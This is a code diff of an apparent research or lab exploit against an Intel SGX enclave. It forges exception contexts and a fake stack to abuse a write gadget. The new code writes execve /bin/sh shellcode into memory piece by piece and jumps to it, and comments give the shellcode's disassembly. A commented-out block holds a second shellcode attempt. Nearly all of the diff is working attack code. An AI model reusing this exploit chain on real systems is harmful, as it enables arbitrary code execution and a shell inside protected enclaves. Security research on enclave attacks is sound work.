@@ -276,53 +276,263 @@ int SGX_CDECL main(int argc, char *argv[])
     unsigned long secret;
     secret = enclaveBaseAddr + secretPos;
 
+    unsigned long overwriteBase = 0x401250;
+    unsigned long writeGadget = 0x8ce5 + enclaveBaseAddr;
+
+
+    /* Exception Context */
+    sgx_exception_info_t ctx[50] = {0};
+
 
     printf("Received: %lx\n", enclaveBaseAddr);
     printf("asm_oret: %lx\n", asmOret);
     printf("continue_execution: %lx\n", continueExecution);
-    printf("secret: %lx\n", secret);
+    printf("writeGadget: %lx\n", writeGadget);
     printf("fakeStack: %lx\n", fakeStack);
+    printf("ctx: %lx\n", (unsigned long)&ctx[0]);
 
     /* Create Fake Stack Frame */
     for(int i = 0; i < 100; i++){
-        fakeStack[i] = i;
+        fakeStack[i] = continueExecution;
     }
-    fakeStack[0] = 0x0000111100002222;
-    fakeStack[1] = 0x1234123412341234;
-    fakeStack[2] = 0x00000000004014ee;
-    fakeStack[4] = 0x1557155715571557;
+    int EXECUTE = 50;
+    fakeStack[EXECUTE] = (unsigned long)fakeStack + (EXECUTE + 1)*8;
+    // fakeStack[0] = 0x0000111100002222;
+    // fakeStack[1] = 0x1234123412341234;
+    // fakeStack[2] = 0x0000000000401469;
+    // fakeStack[4] = 0x1557155715571557;
     
-    /* Exception Context */
-    sgx_exception_info_t ctx;
+    
     // /* Test */
-    // ctx.cpu_context.rax = 1557;
-    ctx.cpu_context.rcx = 1556;
-    ctx.cpu_context.rdx = 1557;
-    ctx.cpu_context.rbx = 1558;
-    // ctx.cpu_context.rsp = 1559;
-    ctx.cpu_context.rbp = 1560;
-    ctx.cpu_context.rdi = 1561;
-    ctx.cpu_context.r8 = 1562;
-    ctx.cpu_context.r9 = 1563;
-    ctx.cpu_context.r10 = 1564;
-    ctx.cpu_context.r11 = 1565;
-    ctx.cpu_context.r12 = 1566;
-    ctx.cpu_context.r13 = 1567;
-    ctx.cpu_context.r14 = 1568;
-    ctx.cpu_context.r15 = 1569;
-    ctx.cpu_context.rflags = 1570;
-    ctx.cpu_context.rip = 1571;
+    // fe58426a
+    // 529948c4
+    // 622fbf48
+    // 2f2f6e69
+    // 54576873
+    // d089495e
+    // 0fd28949
 
-    // ctx.cpu_context.rdi = 
-    ctx.cpu_context.rdx = sizeof(fakeStack);
-    ctx.cpu_context.rsi = (unsigned long)fakeStack;
-    ctx.cpu_context.rsp = (unsigned long)fakeStack+16;
-    ctx.cpu_context.rip = secret;
+//CONT LOOP
+ //CODE INJECT USING WRITEGADGET (SHELL CODE example)
+            // 6a 42                   push   0x42
+            // 58                      pop    rax
+            // fe c4                   inc    ah
+            // 48 99                   cqo
+            // 52                      push   rdx
+            // 48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
+            // 2f 73 68
+            // 57                      push   rdi
+            // 54                      push   rsp
+            // 5e                      pop    rsi
+            // 49 89 d0                mov    r8, rdx
+            // 49 89 d2                mov    r10, rdx
+            // 0f 05                   syscall
+    int increm = 0;
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0xfe58426a;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0x529948c4;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0x622fbf48;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0x2f2f6e69;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0x54576873;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0xd089495e;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0x0fd28949;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rax = 0x00000005;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rdi = (unsigned long)&ctx[increm + 1];
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm++].cpu_context.rip = writeGadget;
+
+    ctx[increm].cpu_context.rflags = 530;
+    ctx[increm].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4*increm;
+    ctx[increm].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[increm].cpu_context.rip = (unsigned long)fakeStack + (EXECUTE + 1)*8;
+
+
+   /* 
+   // SHELL CODE ON PAPER (but doesn't seem to assemble properly 
+   //(enclu)<== enclave instruction so doesn't work without hardware) 
+    ctx[0].cpu_context.rflags = 530;
+    ctx[0].cpu_context.rax = 0xa4f35753;
+    ctx[0].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8;
+    ctx[0].cpu_context.rdi = (unsigned long)&ctx[1];
+    ctx[0].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[0].cpu_context.rip = writeGadget;
+
+    ctx[1].cpu_context.rflags = 530;
+    ctx[1].cpu_context.rax = 0xc04f8d48;
+    ctx[1].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 4;
+    ctx[1].cpu_context.rdi = (unsigned long)&ctx[2];
+    ctx[1].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[1].cpu_context.rip = writeGadget;
+
+    ctx[2].cpu_context.rflags = 530;
+    ctx[2].cpu_context.rax = 0x00998d48;
+    ctx[2].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 8;
+    ctx[2].cpu_context.rdi = (unsigned long)&ctx[3];
+    ctx[2].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[2].cpu_context.rip = writeGadget;
+
+    ctx[3].cpu_context.rflags = 530;
+    ctx[3].cpu_context.rax = 0x0ffffffe;
+    ctx[3].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 12;
+    ctx[3].cpu_context.rdi = (unsigned long)&ctx[4];
+    ctx[3].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[3].cpu_context.rip = writeGadget;
+
+    ctx[4].cpu_context.rflags = 530;
+    ctx[4].cpu_context.rax = 0x665bd701;
+    ctx[4].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 16;
+    ctx[4].cpu_context.rdi = (unsigned long)&ctx[5];
+    ctx[4].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[4].cpu_context.rip = writeGadget;
+
+    ctx[5].cpu_context.rflags = 530;
+    ctx[5].cpu_context.rax = 0x0102828b;
+    ctx[5].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 20;
+    ctx[5].cpu_context.rdi = (unsigned long)&ctx[6];
+    ctx[5].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[5].cpu_context.rip = writeGadget;
     
+    ctx[6].cpu_context.rflags = 530;
+    ctx[6].cpu_context.rax = 0x89660000;
+    ctx[6].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 24;
+    ctx[6].cpu_context.rdi = (unsigned long)&ctx[7];
+    ctx[6].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[6].cpu_context.rip = writeGadget;
     
+    ctx[7].cpu_context.rflags = 530;
+    ctx[7].cpu_context.rax = 0xf9c50443;
+    ctx[7].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 28;
+    ctx[7].cpu_context.rdi = (unsigned long)&ctx[8];
+    ctx[7].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[7].cpu_context.rip = writeGadget;
+
+    ctx[8].cpu_context.rflags = 530;
+    ctx[8].cpu_context.rax = 0xfac5026f;
+    ctx[8].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[8].cpu_context.rdi = (unsigned long)&ctx[9];
+    ctx[8].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[8].cpu_context.rip = writeGadget;
+
+    ctx[9].cpu_context.rflags = 530;
+    ctx[9].cpu_context.rax = 0xc508437f;
+    ctx[9].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[9].cpu_context.rdi = (unsigned long)&ctx[10];
+    ctx[9].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[9].cpu_context.rip = writeGadget;
+
+    ctx[10].cpu_context.rflags = 530;
+    ctx[10].cpu_context.rax = 0x80826ffd;
+    ctx[10].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[10].cpu_context.rdi = (unsigned long)&ctx[11];
+    ctx[10].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[10].cpu_context.rip = writeGadget;
+
+    ctx[11].cpu_context.rflags = 530;
+    ctx[11].cpu_context.rax = 0xc5000001;
+    ctx[11].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[11].cpu_context.rdi = (unsigned long)&ctx[12];
+    ctx[11].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[11].cpu_context.rip = writeGadget;
+
+    ctx[12].cpu_context.rflags = 530;
+    ctx[12].cpu_context.rax = 0x28437ffe;
+    ctx[12].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[12].cpu_context.rdi = (unsigned long)&ctx[13];
+    ctx[12].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[12].cpu_context.rip = writeGadget;
+
+    ctx[13].cpu_context.rflags = 530;
+    ctx[13].cpu_context.rax = 0x01b05952;
+    ctx[13].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[13].cpu_context.rdi = (unsigned long)&ctx[14];
+    ctx[13].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[13].cpu_context.rip = writeGadget;
+
+    ctx[14].cpu_context.rflags = 530;
+    ctx[14].cpu_context.rax = 0x66d7010f;
+    ctx[14].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[14].cpu_context.rdi = (unsigned long)&ctx[15];
+    ctx[14].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[14].cpu_context.rip = writeGadget;
+
+    ctx[15].cpu_context.rflags = 530;
+    ctx[15].cpu_context.rax = 0xf3026f0f;
+    ctx[15].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[15].cpu_context.rdi = (unsigned long)&ctx[16];
+    ctx[15].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[15].cpu_context.rip = writeGadget;
+    
+
+    ctx[16].cpu_context.rflags = 530;
+    ctx[16].cpu_context.rax = 0x00457f0f;
+    ctx[16].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[16].cpu_context.rdi = (unsigned long)&ctx[17];
+    ctx[16].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[16].cpu_context.rip = writeGadget;
+    
+
+    ctx[17].cpu_context.rflags = 530;
+    ctx[17].cpu_context.rax = 0x0f04b05b;
+    ctx[17].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[17].cpu_context.rdi = (unsigned long)&ctx[18];
+    ctx[17].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[17].cpu_context.rip = writeGadget;
+    
+
+    ctx[18].cpu_context.rflags = 530;
+    ctx[18].cpu_context.rax = 0x0000d701;
+    ctx[18].cpu_context.rcx = (unsigned long)fakeStack + (EXECUTE + 1)*8 + 32;
+    ctx[18].cpu_context.rdi = (unsigned long)&ctx[18];
+    ctx[18].cpu_context.rsp = (unsigned long)fakeStack;
+    ctx[18].cpu_context.rip = writeGadget;
+     */
+    //
     /* Execute Attack */
     // testAttack(secret);  //Test attack
-    initAttack(ctx, continueExecution); 
+    initAttack(ctx[0], continueExecution); 
     /* Destroy the enclave */
     printf("Attack has been executed awaiting to destroy enclave.\n");
 
